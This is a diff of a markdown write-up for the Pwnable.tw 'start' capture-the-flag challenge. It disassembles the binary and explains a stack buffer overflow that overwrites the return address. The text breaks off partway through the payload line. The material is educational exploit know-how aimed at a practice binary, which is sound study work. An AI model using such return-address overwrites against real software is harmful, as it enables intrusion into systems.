@@ -11,9 +11,9 @@ description:  A 100-point challenge from Pwnable.tw
 
 <b>Write-up by:</b><span style="color:#007bff"> https://github.com/heckintosh </span>
 
-A typical stack overflow with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.
+A typical buffer overflow attack with a little twist. For these first few challenges, I like to write in details so that I (and the readers) can remember the basic and fundamentals well.
 
-## Initial Analysis
+## 1. Initial Analysis
 First we get the type of the file.
 ```bash
 $ file start                                   
@@ -45,7 +45,7 @@ Non-debugging symbols:
 0x080490a4  _end  
 ```
 
-## Assembly Analysis
+## 2. Assembly Analysis
 ```
 pwndbg> start
 pwndbg> disass
@@ -58,11 +58,11 @@ Dump of assembler code for function _start:
 0x08048068 <+8>:     xor    ebx,ebx
 0x0804806a <+10>:    xor    ecx,ecx
 0x0804806c <+12>:    xor    edx,edx
-0x0804806e <+14>:    push   0x3a465443              // CTF
-0x08048073 <+19>:    push   0x20656874              // ('the ')
-0x08048078 <+24>:    push   0x20747261              // ('art ')
-0x0804807d <+29>:    push   0x74732073              // ('s st')
-0x08048082 <+34>:    push   0x2774654c              // ("Let'")
+0x0804806e <+14>:    push   0x3a465443              // PUSH CTF
+0x08048073 <+19>:    push   0x20656874              // PUSH ('the ')
+0x08048078 <+24>:    push   0x20747261              // PUSH ('art ')
+0x0804807d <+29>:    push   0x74732073              // PUSH ('s st')
+0x08048082 <+34>:    push   0x2774654c              // PUSH ("Let'")
 0x08048087 <+39>:    mov    ecx,esp                 // Ecx contains the char pointer to the string one wants to print. In this case it is the ESP.
 0x08048089 <+41>:    mov    dl,0x14                 // dl (edx) contains the size of the char array ones want to print. 0x14 = 20 bytes just enough for the string
 0x0804808b <+43>:    mov    bl,0x1                  // bl (ebx) defines file descriptor. 1 means STDOUT
@@ -79,4 +79,48 @@ Dump of assembler code for function _start:
 Understand the code and you can move on to the next step.
 
 
-### Binary Exploitation
+## 3. Exploitation
+
+#### Locating the buffer
+In order to overflow the buffer, we have to know where it is. As you can see the syscall write has ecx denoting the start of the buffer. The size of the buffer is 20 bytes.
+
+[Add image here]
+
+Let's focus on these instructions, which is where you can give input:
+
+
+```nasm
+0x08048091 <+49>:    xor    ebx,ebx         // fd = 0 ==> STDIN
+0x08048093 <+51>:    mov    dl,0x3c         // Read up to 60 bytes from user input.
+0x08048095 <+53>:    mov    al,0x3          // 3 means read.
+0x08048097 <+55>:    int    0x80            // syscall, the missing ecx is taken from the above, which means user input will be written to the stack.
+```
+
+So whatever you input will overwrite the stack defined by the instructions before. I inputed test and you can see what happens to the stack below. 
+
+```
+──────────────────────────────────────[ STACK ]───────────────────────────────────────────────
+00:0000│ ecx esp 0xffffce04 ◂— 0x74736574 ('test')
+01:0004│         0xffffce08 ◂— 0x7473200a ('\n st')
+02:0008│         0xffffce0c ◂— 0x20747261 ('art ')
+03:000c│         0xffffce10 ◂— 0x20656874 ('the ')
+04:0010│         0xffffce14 ◂— 0x3a465443 ('CTF:')
+05:0014│         0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
+06:0018│         0xffffce1c —▸ 0xffffce20 ◂— 0x1
+07:001c│         0xffffce20 ◂— 0x1
+```
+
+The following instructions clean ups 20 bytes the stack, essentially leaves the ret at 0xffffce18 —▸ 0x804809d (_exit) ◂— pop    esp
+```nasm
+0x08048099 <+57>:    add    esp,0x14                // clean stack
+0x0804809c <+60>:    ret 
+```
+
+So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.
+
+#### Overwrite the return address
+Now we just overwrite the exit address with 0xffffce04, which is top of the stack. So our payload will look something like this: 
+
+```
+AAAAAAAAAAAAAAAAAAAA\x04\x
+```
